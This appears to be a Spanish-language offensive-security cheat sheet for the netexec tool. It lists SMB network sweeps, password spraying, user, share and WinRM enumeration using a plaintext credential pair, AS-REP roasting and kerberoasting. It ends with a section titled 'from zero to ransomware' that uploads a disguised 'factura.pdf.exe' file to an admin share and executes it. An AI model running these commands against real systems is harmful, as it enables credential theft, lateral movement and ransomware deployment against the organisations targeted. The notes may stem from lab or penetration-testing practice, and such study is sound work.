### Barridos de red / password spray

Barrido de red smb:

```bash
netexec smb 172.16.199.0/24 -u '' -p '' | awk '{print $2}' > smb_discovery.txt
cat smb_discovery.txt| sort -u | grep -Ei "[*\\.]" > temp.txt && mv temp.txt smb_discovery.txt
```

Password spray para enumerar credenciales válidas:

```bash
netexec smb 172.16.120.6 -u users.txt -p pass.txt --continue-on-success | grep -vi 'failure'
```

Enumerar descripciones de usuarios:

```bash
netexec smb smb_discovery.txt -u 'maildmz' -p 'DPuBT9tGCBrTbR' --users | grep -v "+"
netexec ldap smb_discovery.txt -u 'maildmz' -p 'DPuBT9tGCBrTbR' --users | grep -v "+"
```

Enumerar shares de todas las máquinas:

```bash
netexec smb smb_discovery.txt -u 'maildmz' -p 'DPuBT9tGCBrTbR' --shares | grep -v "+"
```

Enumerar permisos de protocolos (winrm en este caso) para un usuario en todas
las máquinas:

```bash
netexec winrm smb_discovery.txt -u 'maildmz' -p 'DPuBT9tGCBrTbR' | grep -vi "-"
```

Si queremos añadir todas las máquinas en el /etc/hosts rápidamente:

```bash
netexec smb 10.5.10.0/24 --generate-hosts-file hosts_file
cat hosts_file -> copiar y pegar en el /etc/hosts
```

### Policies y enumeración general del entorno

Para enumerar la password policy:

```bash
netexec smb <IP> -u 'guest' -p '' --pass-pol
```

También podemos enumerar ordenadores o sesiones en el dominio:

```bash
netexec smb <DC-IP> -u 'x' -p 'y' --computers
netexec smb <DC-IP> -u 'x' -p 'y' --sessions
```

Otra opción que nos puede servir son los módulos. Para listar los módulos de un
protocolo podemos ejecutar:

```bash
netexec smb -L
netexec ldap -L
```

Por ejemplo, podemos enumerar máquinas unidas al dominio con:

```bash
netexec ldap <IP> -u 'x' -p 'y' -M maq
```

### Ejemplo ataque completo con netexec - de cero a ransomware

Ataque de asreproast:

```bash
netexec ldap <IP> -u 'x' -p '' --asreproast hashes.txt
```

Ataque de kerberoasting:

```bash
netexec ldap <IP> -u 'x -p 'y' --kerberoast hashes_kerberoast.txt
```

Subir un archivo (ransomware):

```bash
netexec smb <IP> -u 'x' -p 'y' --share C$ --put-file factura.pdf.exe USERS\\Public\\Downloads\\factura_urgente.pdf.exe -x "C:\users\Public\Downloads\factura.pdf.exe"
```
